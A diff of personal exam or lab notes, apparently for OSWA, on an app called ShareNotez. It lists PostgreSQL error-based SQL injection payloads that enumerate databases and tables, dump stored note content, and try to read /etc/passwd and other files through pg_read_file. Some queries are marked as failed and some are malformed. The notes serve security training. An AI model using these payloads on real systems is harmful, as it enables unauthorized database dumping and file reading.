@@ -92,7 +92,7 @@ first working query, this is really annoying because i need to get a new `uuid` 
 the goal is to map out the database and hopefully be able to dump from it
 ```bash
 '; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) AS integer))--
-'; (SELECT CAST(SUBSTRING(version() FROM 'PostgreSQL ([0-9]+)\.') AS INTEGER);--
+
 database: postgres
 ```
 ![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic36.png]]
@@ -119,6 +119,8 @@ database: template0
 '; (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 0) AS integer))--
 
 table: users
+
+'; (SELECT CAST((dbname=lophostrix SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 0) AS integer))--
 ```
 ![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic40.png]]
 ```bash
@@ -255,4 +257,51 @@ column in notes table: content
 '; SELECT 1 / CAST((SELECT content FROM notes LIMIT 1 OFFSET 0) AS INTEGER); --
 
 content from notes table: e84edOziE/Knw2SKbNoyY5PGseegEfUGTyPxSpzuD3k=
+```
+
+
+### Current User (Failed)
+```bash
+'; (SELECT CAST(ASCII(SUBSTRING(current_user,1,1)) AS integer)); --
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic61.png]]
+I get a hint when taking away the 1
+```bash
+'; (SELECT CAST(ASCII(SUBSTRING(current_user)) AS integer)); --
+ Hint: No function matches the given name and argument types. You might need to add explicit type casts.
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic62.png]]
+continued from course material
+```bash
+'; select version();
+'; (SELECT CAST(ASCII(SUBSTRING(select version(); AS Integer)); --
+```
+### Confirm Super User (Failed)
+```bash
+'; (SELECT CAST((SELECT CASE WHEN rolsuper THEN 1 ELSE 0 END FROM pg_roles WHERE rolname = current_user) AS integer))--
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic63.png]]
+
+### Reading /etc/passwd (Permission denied)
+
+```bash
+'; (SELECT CAST(LENGTH(pg_read_file('/etc/passwd',0,1000)) AS integer))-- 
+```
+permission denied
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic64.png]]
+
+### Version
+```bash
+'; SELECT version(); --
+```
+a result was returned when none was expected
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic65.png]]
+```bash
+'; SELECT version() as integer; --
+'; SELECT current_setting('server_version'); --
+'; SELECT CAST(SUBSTRING(version() FROM 'PostgreSQL (\\d+\\.\\d+)') AS integer); --
+```
+
+```bash
+'; (SELECT CAST(pg_read_file('my_file.txt', 0, 100000000) AS XML); --
 ```
